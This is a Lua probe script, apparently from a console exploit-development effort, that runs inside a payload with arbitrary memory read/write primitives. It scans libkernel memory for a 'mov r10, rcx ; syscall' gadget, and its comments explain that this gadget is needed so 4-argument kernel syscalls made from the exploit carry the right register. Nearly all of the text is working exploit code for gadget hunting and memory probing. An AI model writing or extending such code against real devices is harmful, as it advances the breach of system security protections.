-- CRASH_CLASS: LOW
-- PROBE 1212b: locate a "mov r10, rcx ; syscall" trampoline by qword scanning.
--
-- 1212a proved that memory.read_buffer(libkernel_base, 0x40000) wedges the payload
-- (LOADER-STUCK), so the scan is done with memory.read_qword and a rolling window.
-- Purpose is unchanged: syscall argument 4 reaches the kernel in r10, the stock
-- stub is gettimeofday's wrapper (two arguments, so no mov r10,rcx), and every
-- 4-argument call in this corpus therefore carried a stale r10.

print("=== PROBE 1212b: qword scan for mov r10,rcx ; syscall ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end

local okb, base = pcall(function() return to_num(libkernel_base) end)
print(string.format("[0] libkernel_base=0x%X", base))
if not okb or base == 0 then print("=== 1212b DONE ===") return end

-- single-qword read first: confirms the region is readable at all
local okq, q = pcall(function() return to_num(memory.read_qword(base)) end)
print(string.format("[1] qword@base ok=%s val=0x%X", tostring(okq), okq and q or 0))
if not okq then print("=== 1212b DONE ===") return end

local function scan(addr, nq, want)
    local hist, found = {}, {}
    for i = 0, nq-1 do
        local okv, v = pcall(function() return to_num(memory.read_qword(addr + i*8)) end)
        if not okv then return found, i end
        local b, x = {}, v
        for k = 1, 8 do b[k] = x % 256; x = math.floor(x / 256) end
        for k = 1, 8 do
            hist[#hist+1] = b[k]
            local L = #hist
            local hit = true
            for j = 1, #want do
                if hist[L-#want+j] ~= want[j] then hit = false break end
            end
            if hit then found[#found+1] = addr + i*8 + (k-1) - (#want-1) end
            if #hist > #want then table.remove(hist, 1) end
        end
        if i % 0x2000 == 0x1fff then print(string.format("    ..scanned 0x%X", (i+1)*8)) end
    end
    return found, nq
end

local pat = {0x49, 0x89, 0xca, 0x0f, 0x05}
print("[2] scanning 0x20000 bytes for 49 89 ca 0f 05")
local found, done = scan(base, 0x20000/8, pat)
print(string.format("    scanned %d qwords, %d hit(s)", done, #found))
for i = 1, math.min(#found, 10) do
    print(string.format("    hit[%d] va=0x%X (offset 0x%X)", i, found[i], found[i]-base))
end

-- also report the stock stub's neighbourhood for reference
local okg, gt = pcall(function() return to_num(memory.read_qword(libc_addrofs.gettimeofday_import)) end)
if okg then
    print(string.format("[3] gettimeofday wrapper=0x%X  (stock stub = +7 = 0x%X)", gt, gt+7))
    local w = {}
    for i = 0, 7 do w[i] = rd(gt+7+i) end
    print(string.format("    bytes at +7: %02X %02X %02X %02X %02X %02X %02X %02X",
        w[0]%256, w[1]%256, w[2]%256, w[3]%256, w[4]%256, w[5]%256, w[6]%256, w[7]%256))
end

print("=== 1212b DONE ===")
